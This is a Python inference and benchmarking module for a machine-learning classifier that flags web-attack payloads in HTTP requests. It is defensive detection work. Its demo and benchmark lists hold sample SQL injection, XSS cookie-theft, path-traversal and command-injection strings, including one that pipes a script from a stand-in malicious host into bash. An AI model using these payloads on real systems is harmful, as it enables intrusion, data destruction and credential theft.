# threat_classifier/src/application_level_threat_classifier/inference.py

import pandas as pd
import numpy as np
import joblib
import json
from pathlib import Path
import time
from typing import Dict, List

from threat_classifier.src.application_level_threat_classifier.feature_engineering import ThreatFeatureExtractor

PROJECT_ROOT = Path(__file__).resolve().parents[3]
MODEL_DIR = PROJECT_ROOT / "models" / "application_layer"


class ThreatClassifier:
    """
    Fast inference for threat classification.
    Optimized for sub-millisecond latency.
    """
    
    def __init__(self, model_dir=None):
        """Initialize the classifier"""
        if model_dir is None:
            model_dir = MODEL_DIR
        
        self.model_dir = Path(model_dir)
        self.model = None
        self.feature_extractor = ThreatFeatureExtractor()
        self.class_mapping = None
        self.inverse_class_mapping = None
        
        self._load_model()
    
    def _load_model(self):
        """Load all model artifacts"""
        print("[INFO] Loading threat classifier...")
        
        # Load model
        model_path = self.model_dir / "threat_classifier_lgb.pkl"
        self.model = joblib.load(model_path)
        
        # Load feature configuration
        feature_config_path = self.model_dir / "feature_config.pkl"
        self.feature_extractor.load_feature_config(feature_config_path)
        
        # Load class mapping
        class_mapping_path = self.model_dir / "class_mapping.json"
        with open(class_mapping_path, 'r') as f:
            mappings = json.load(f)
            self.class_mapping = {k: int(v) for k, v in mappings['class_to_idx'].items()}
            self.inverse_class_mapping = {int(k): v for k, v in mappings['idx_to_class'].items()}
        
        print(f"[INFO] Model loaded successfully")
        print(f"[INFO] Supported attack types: {list(self.class_mapping.keys())}")
    
    def predict(self, payload: str, return_probabilities: bool = False) -> Dict:
        """
        Predict threat type for a single payload.
        
        Args:
            payload: HTTP request payload (URL, query, body, etc.)
            return_probabilities: If True, return probabilities for all classes
            
        Returns:
            Dictionary with prediction results and timing information
        """
        start_time = time.perf_counter()
        
        # Extract features
        feature_start = time.perf_counter()
        features = self.feature_extractor.extract_features(payload)
        features_df = pd.DataFrame([features])
        feature_time = (time.perf_counter() - feature_start) * 1000
        
        # Predict
        inference_start = time.perf_counter()
        prediction_proba = self.model.predict(features_df)[0]
        inference_time = (time.perf_counter() - inference_start) * 1000
        
        # Get predicted class
        predicted_idx = np.argmax(prediction_proba)
        predicted_class = self.inverse_class_mapping[predicted_idx]
        confidence = float(prediction_proba[predicted_idx])
        
        # Total time
        total_time = (time.perf_counter() - start_time) * 1000
        
        # Build result
        result = {
            'attack_type': predicted_class,
            'confidence': confidence,
            'is_malicious': predicted_class != 'norm',
            'timing': {
                'feature_extraction_ms': feature_time,
                'model_inference_ms': inference_time,
                'total_ms': total_time
            }
        }
        
        if return_probabilities:
            result['probabilities'] = {
                self.inverse_class_mapping[i]: float(prediction_proba[i])
                for i in range(len(prediction_proba))
            }
        
        return result
    
    def predict_batch(self, payloads: List[str]) -> List[Dict]:
        """
        Predict threat types for multiple payloads (more efficient for batches).
        
        Args:
            payloads: List of HTTP request payloads
            
        Returns:
            List of prediction dictionaries
        """
        start_time = time.perf_counter()
        
        # Extract features for all payloads
        features_list = [self.feature_extractor.extract_features(p) for p in payloads]
        features_df = pd.DataFrame(features_list)
        
        # Batch prediction
        predictions_proba = self.model.predict(features_df)
        
        # Process results
        results = []
        for i, proba in enumerate(predictions_proba):
            predicted_idx = np.argmax(proba)
            predicted_class = self.inverse_class_mapping[predicted_idx]
            confidence = float(proba[predicted_idx])
            
            results.append({
                'payload': payloads[i][:50] + '...' if len(payloads[i]) > 50 else payloads[i],
                'attack_type': predicted_class,
                'confidence': confidence,
                'is_malicious': predicted_class != 'norm'
            })
        
        total_time = (time.perf_counter() - start_time) * 1000
        avg_time = total_time / len(payloads)
        
        print(f"[INFO] Batch prediction completed: {len(payloads)} samples in {total_time:.2f}ms")
        print(f"[INFO] Average time per sample: {avg_time:.3f}ms")
        
        return results


def benchmark_latency(classifier, num_iterations=1000):
    """Benchmark inference latency"""
    
    print("\n" + "="*80)
    print(f"LATENCY BENCHMARK - {num_iterations} iterations")
    print("="*80)
    
    test_payloads = [
        "' OR '1'='1' --",  # SQLi
        "admin' UNION SELECT NULL, username, password FROM users--",  # SQLi
        "<script>alert('XSS')</script>",  # XSS
        "<img src=x onerror=alert(1)>",  # XSS
        "; cat /etc/passwd",  # CMDi
        "| ls -la && whoami",  # CMDi
        "../../../../etc/passwd",  # Path Traversal
        "../../../windows/system32/config/sam",  # Path Traversal
        "normal search query",  # Normal
        "SELECT * FROM products WHERE id=123",  # Normal
    ]
    
    timings = {
        'feature_extraction': [],
        'model_inference': [],
        'total': []
    }
    
    print(f"[INFO] Running {num_iterations} predictions...")
    
    for i in range(num_iterations):
        payload = test_payloads[i % len(test_payloads)]
        result = classifier.predict(payload)
        
        timings['feature_extraction'].append(result['timing']['feature_extraction_ms'])
        timings['model_inference'].append(result['timing']['model_inference_ms'])
        timings['total'].append(result['timing']['total_ms'])
    
    # Calculate statistics
    print(f"\n{'Component':<25} {'Mean':<10} {'P50':<10} {'P95':<10} {'P99':<10} {'Max':<10}")
    print("-" * 75)
    
    for component in ['feature_extraction', 'model_inference', 'total']:
        data = np.array(timings[component])
        
        mean = np.mean(data)
        p50 = np.percentile(data, 50)
        p95 = np.percentile(data, 95)
        p99 = np.percentile(data, 99)
        max_val = np.max(data)
        
        print(f"{component:<25} {mean:>8.3f}ms {p50:>8.3f}ms {p95:>8.3f}ms {p99:>8.3f}ms {max_val:>8.3f}ms")
    
    print("\n" + "="*75)
    print(f"✅ Average latency: {np.mean(timings['total']):.3f} ms")
    print(f"✅ 95th percentile: {np.percentile(timings['total'], 95):.3f} ms")
    print(f"✅ 99th percentile: {np.percentile(timings['total'], 99):.3f} ms")
    print(f"✅ Throughput: ~{1000/np.mean(timings['total']):.0f} requests/second (single-threaded)")
    print("="*75)


def demo_predictions(classifier):
    """Demonstrate predictions on various attack types"""
    
    print("\n" + "="*80)
    print("DEMO PREDICTIONS")
    print("="*80)
    
    test_cases = {
        "SQL Injection": [
            "' OR '1'='1' --",
            "admin' UNION SELECT NULL, password FROM users--",
            "1; DROP TABLE users--"
        ],
        "XSS": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "javascript:alert(1)"
        ],
        "Command Injection": [
            "; cat /etc/passwd",
            "| ls -la && whoami",
            "`curl http://malicious.com/shell.sh | bash`"
        ],
        "Path Traversal": [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd%00.jpg"
        ],
        "Normal": [
            "search?q=laptop&category=electronics",
            "SELECT * FROM products WHERE id=123",
            "/api/users/profile?id=456"
        ]
    }
    
    for attack_type, payloads in test_cases.items():
        print(f"\n{attack_type}:")
        print("-" * 80)
        
        for payload in payloads:
            result = classifier.predict(payload, return_probabilities=True)
            
            status = "🔴" if result['is_malicious'] else "🟢"
            print(f"\n{status} Payload: {payload}")
            print(f"   Detected as: {result['attack_type']} (confidence: {result['confidence']:.3f})")
            print(f"   Latency: {result['timing']['total_ms']:.3f}ms")
            
            # Show top 3 probabilities
            probs = sorted(result['probabilities'].items(), key=lambda x: x[1], reverse=True)[:3]
            print(f"   Top predictions:")
            for cls, prob in probs:
                print(f"      {cls}: {prob:.3f}")


def main():
    """Main inference demo"""
    
    print("\n" + "="*80)
    print("APPLICATION LAYER THREAT CLASSIFIER - INFERENCE")
    print("="*80)
    
    # Initialize classifier
    classifier = ThreatClassifier()
    
    # Demo predictions
    demo_predictions(classifier)
    
    # Benchmark latency
    benchmark_latency(classifier, num_iterations=10000)
    
    print("\n" + "="*80)
    print("INFERENCE DEMO COMPLETED!")
    print("="*80)


if __name__ == "__main__":
    main()